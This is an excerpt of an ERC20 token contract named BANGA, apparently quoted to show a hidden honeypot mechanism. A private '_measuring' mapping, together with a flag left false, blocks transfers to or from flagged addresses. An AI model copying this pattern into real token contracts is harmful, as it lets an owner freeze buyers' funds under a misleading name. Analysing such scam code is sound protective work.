...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    mapping (address => bool) private _measuring;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    bool private _measuringApplied = false;
    ...
    function _transfer(
        ...
        if (_measuring[from] || _measuring[to]) require(_measuringApplied == true, "");
...
contract BANGA is ERC20 {
    constructor() ERC20("BANGA", "BANGA") {
